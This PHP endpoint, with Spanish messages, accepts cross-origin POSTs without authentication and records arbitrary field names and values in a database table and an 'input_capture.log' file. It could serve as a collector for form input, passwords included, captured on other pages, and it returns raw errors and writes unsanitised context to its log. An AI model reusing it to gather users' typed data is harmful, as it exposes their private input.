<?php
declare(strict_types=1);
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); echo json_encode(['success'=>false,'error'=>'Método no permitido']); exit; }
require __DIR__ . '/db.php';

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) $data = $_POST;
$field = trim((string)($data['field'] ?? ''));
$value = (string)($data['value'] ?? '');
$context = trim((string)($data['context'] ?? ''));
if ($field === '') { http_response_code(400); echo json_encode(['success'=>false,'error'=>'Campo "field" requerido']); exit; }

try {
  $pdo = db();
  // Asegurar tabla input_logs existe para ambos drivers
  try {
    $driver = $pdo->getAttribute(PDO::ATTR_DRIVER_NAME);
    if ($driver === 'mysql') {
      $pdo->exec(
        'CREATE TABLE IF NOT EXISTS input_logs (
          id INT AUTO_INCREMENT PRIMARY KEY,
          field TEXT NOT NULL,
          value TEXT NOT NULL,
          context TEXT NULL,
          created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4'
      );
    } else {
      $pdo->exec(
        'CREATE TABLE IF NOT EXISTS input_logs (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          field TEXT NOT NULL,
          value TEXT NOT NULL,
          context TEXT NULL,
          created_at TEXT NOT NULL
        )'
      );
    }
  } catch (Throwable $ie) { /* silencioso: si ya existe */ }
  $stmt = $pdo->prepare('INSERT INTO input_logs(field,value,context,created_at) VALUES (?,?,?,?)');
  $stmt->execute([$field,$value,$context,date('c')]);
  // Append simple line log
  $logDir = __DIR__ . '/../data';
  if (!is_dir($logDir)) @mkdir($logDir,0775,true);
  $line = date('c')."\t".$field."\t".str_replace(["\r","\n"],' ',substr($value,0,300))."\t".$context."\n";
  file_put_contents($logDir.'/input_capture.log',$line,FILE_APPEND|LOCK_EX);
  echo json_encode(['success'=>true]);
} catch (Throwable $e) {
  http_response_code(500);
  echo json_encode(['success'=>false,'error'=>$e->getMessage()]);
}
